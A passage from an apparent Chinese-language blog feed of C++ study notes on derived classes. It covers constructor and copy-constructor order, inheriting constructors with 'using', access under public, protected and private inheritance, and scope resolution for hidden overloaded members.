class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;                                             <span class="comment">//getx</span></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;                                        <span class="comment">//getx重载</span></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">father::x = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s) :father&#123;s&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; _age &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;                                             <span class="comment">//getx</span></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;                                        <span class="comment">//getx重载</span></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun1/007.png" class=""><p>对于相同的重载问题，虽然是重载，但是属于谁的，显然作用域在son里面，father的就会被覆盖掉。</p><p>要解决，using已经不够了，只能上我们的作用域。</p><img src="/2022/06/30/DerivedclassFun1/010.png" class=""><p>靠作用域区分也的确达到了效果。</p><p>作用域区分已经较为熟悉了，给grandson上一个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="keyword">using</span> son::son;</span><br><span class="line"><span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">grandson</span>(<span class="type">const</span> grandson &amp;g) :son&#123;g&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun1/011.png" class=""><p>根据层次赋值，根据层次打印。作用域区分是最为直观的。<br>using的借用根据情况而定。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>虽然看完写下来还是迷迷糊糊的感觉，但是大致上有方向了。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>派生类的构造函数</title>
      <link href="/2022/06/30/DerivedclassFun/"/>
      <url>/2022/06/30/DerivedclassFun/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>类的构造函数如果没有特别定义，则会使用默认的构造函数，即空的情况，调用了也没变化。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">father fh;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun/000.png" class=""><p>当实例化一个类的时候，然后我们特定构造函数有输出。</p><p>这便是最常见的情况。</p><p>那么当类的派生类出现的时候，实例化这个派生类，会调用什么构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun/001.png" class=""><p>显然实例化的派生类的时候，他在继承基类的属性时，会一并执行构造函数。<br>并且也是按照继承顺序执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun/002.png" class=""><p>可以看到继承的顺序，决定了构造函数的执行顺序。</p><hr><h2 id="副本构造函数"><a href="#副本构造函数" class="headerlink" title="副本构造函数"></a>副本构造函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">father</span>(<span class="type">const</span> father &amp;f)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">grandson</span>(<span class="type">const</span> grandson &amp;g)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun/003.png" class=""><p>结果似乎有点超出预期，在执行&#x3D;的时候，发现只进行了一次copy。<br>说明类在继承的时候只会调用基类的构造函数，而不会调用副本构造函数。</p><p>想要人为干预的时候，需要用到以前的列表初始化。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>既然已经新增了构造函数，那么副本构造就也可以使用列表方式初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">father</span>(<span class="type">const</span> father &amp;f)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s) :father&#123;s&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">grandson</span>(<span class="type">const</span> grandson &amp;g) :son&#123;g&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一环套一环的操作之后。再看看它的拷贝顺序。</p><img src="/2022/06/30/DerivedclassFun/004.png" class=""><p>看到手动创建了新的构造函数之后，在副本构造函数上同样使用列表初始化的操作，他就可以无缝衔接上了。</p><p>当然这也是继承的特点之一。<br>因为类的副本构造函数它是有要求传入的数据类型，我们用grandson去进行拷贝，通过继承，它用基类套基类，只不过现在只能浅述。</p><img src="/2022/06/30/DerivedclassFun/005.png" class=""><p>因为这个特性，他甚至可以直接这样完成拷贝。</p><hr><p>派生类中的副本构造函数并不会自动调用基类的副本构造函数，需要我们手动指定。</p><hr><h2 id="继承构造函数"><a href="#继承构造函数" class="headerlink" title="继承构造函数"></a>继承构造函数</h2><p>通过using基类::基类构造函数可以继承基类构造函数，但是默认构造函数与副本构造函数不会被继承。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> son::son;</span><br></pre></td></tr></table></figure><p>通过强制指定：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s) :father&#123;s&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; _age &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">using</span> son::son;</span><br><span class="line"><span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">grandson</span>(<span class="type">const</span> grandson &amp;g) :son&#123;g&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun/006.png" class=""><p>可以看到grandson强制继承了构造函数之后，我们实例化的时候进行初始化，他会直接调用我们的基类son去完成构造。</p><p>并且这个解锁因为是构造函数，所以在派生类的private中解锁，效果也是一样的。<br><strong>因为继承的成员没有指定函数()里面的形参，所以继承的时候会带上重载的</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>构造完还有析构。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>派生类的访问</title>
      <link href="/2022/06/29/Derivedclass/"/>
      <url>/2022/06/29/Derivedclass/</url>
      
        <content type="html"><![CDATA[<h1 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h1><p>类中有三种属性划分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:             <span class="comment">//公有</span></span><br><span class="line"><span class="keyword">private</span>:            <span class="comment">//私有</span></span><br><span class="line"><span class="keyword">protected</span>:          <span class="comment">//受保护的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><p>而前面继承的时候我们都用的public,其实其他两种也能使用。<br>只不过访问方式就产生变化了。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span> :  属性 基类&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三种继承属性*三种成员属性。它的访问方式就变得复杂了。</p><hr><h2 id="public"><a href="#public" class="headerlink" title="public"></a>public</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span> : <span class="keyword">public</span> 基类&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候，就是之前学的状态。<br>公有都基类派生类可以访问<br>私有只有基类可以访问<br>受保护的基类可以访问、派生类只能由成员函数访问</p><hr><h2 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span> : <span class="keyword">protected</span> 基类&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果继承方式变成protected。访问的权限就又变了。<br>public就变成了protected。<br>然后私有还是私有。<br>以之前的例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">protected</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当grandson处于protected继承时。<br>实例化的对象，就只能访问sex了。</p><img src="/2022/06/29/Derivedclass/000.png" class=""><p>当然同时保持之前的规则，派生类中是可以访问到son的public成员的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">protected</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    <span class="built_in">grandson</span>()&#123;</span><br><span class="line">        height=<span class="number">200</span>;</span><br><span class="line">        age = <span class="number">10</span>;</span><br><span class="line">        weight = <span class="number">20.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">private</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    <span class="built_in">grandson</span>()&#123;</span><br><span class="line">        height=<span class="number">200</span>;</span><br><span class="line">        age = <span class="number">10</span>;</span><br><span class="line">        weight = <span class="number">20.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当grandson以private继承son的时候。<br>son的成员在grandson中就都变成了private<br>私有的成员我们知道只能在类中访问。<br>他与protected存在的差异就是当这个grandson再次被别人以public继承的时候。<br>基类成员都处于private状态，是不可访问的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">box</span> : <span class="keyword">public</span> grandson&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">box</span>()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/29/Derivedclass/001.png" class=""><p>压根找不到的</p><hr><img src="/2022/06/29/Derivedclass/002.png" class=""><p>继承原则大概就是这样</p><hr><h2 id="修改继承的访问属性"><a href="#修改继承的访问属性" class="headerlink" title="修改继承的访问属性"></a>修改继承的访问属性</h2><p><code>using 基类名::成员名</code><br><strong>注意：基类中的私有成员属性是依旧无法修改的，因为本身就不可能访问</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">private</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">using</span> son::height;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>按常理来说，这种情况由grandson实例化的对象是无法访问到其中的成员的。<br>但是经过using修改，就可以达到效果</p><img src="/2022/06/29/Derivedclass/003.png" class=""><p>因为grandson是以private继承的son，其中son的public继承过来就变成private了。<br>我们依然可以通过using修改。</p><img 